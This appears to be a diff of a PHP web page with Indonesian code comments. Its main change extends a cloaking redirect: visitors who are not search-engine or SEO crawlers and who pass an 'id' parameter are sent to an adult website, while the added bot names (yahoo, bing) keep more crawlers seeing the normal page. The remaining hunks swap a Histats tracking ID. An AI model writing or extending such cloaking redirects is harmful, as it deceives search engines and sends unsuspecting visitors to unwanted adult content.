@@ -4,7 +4,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 
     // Modifikasi: Hanya redirect jika BUKAN bot DAN ada parameter 'id' di URL
     // Anda bisa menambahkan bot lain di sini (misal: |yandex|bingbot)
-    if (!preg_match('/google|yandex|semrush|ahrefs/i', $user_agent) && isset($_GET['id']) && !empty($_GET['id'])) {
+    if (!preg_match('/google|yandex|semrush|ahrefs|yahoo|bing/i', $user_agent) && isset($_GET['id']) && !empty($_GET['id'])) {
         header('Location: https://javpornsub.net');
         exit;
     }
@@ -1763,9 +1763,9 @@ $thumbnail = "https://www.techsmith.com/blog/wp-content/uploads/2021/02/video-th
         <path d="M0,0v64h64V0H0z M44.7,25.5c0,0.3,0,0.6,0,0.8C44.7,35,38.1,45,26.1,45c-3.7,0-7.2-1.1-10.1-2.9 c0.5,0.1,1,0.1,1.6,0.1c3.1,0,5.9-1,8.2-2.8c-2.9-0.1-5.3-2-6.1-4.6c0.4,0.1,0.8,0.1,1.2,0.1c0.6,0,1.2-0.1,1.7-0.2 c-3-0.6-5.3-3.3-5.3-6.4c0,0,0-0.1,0-0.1c0.9,0.5,1.9,0.8,3,0.8c-1.8-1.2-2.9-3.2-2.9-5.5c0-1.2,0.3-2.3,0.9-3.3 c3.2,4,8.1,6.6,13.5,6.9c-0.1-0.5-0.2-1-0.2-1.5c0-3.6,2.9-6.6,6.6-6.6c1.9,0,3.6,0.8,4.8,2.1c1.5-0.3,2.9-0.8,4.2-1.6 c-0.5,1.5-1.5,2.8-2.9,3.6c1.3-0.2,2.6-0.5,3.8-1C47.1,23.4,46,24.5,44.7,25.5z" />
       </symbol>
     </svg>
-       <!-- Histats.com  START  (aync)-->
+<!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,4932699,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,4950727,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -1773,8 +1773,7 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4932699&101" alt="" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4950727&101" alt="" border="0"></a></noscript>
 <!-- Histats.com  END  -->
   </body>
 </html>
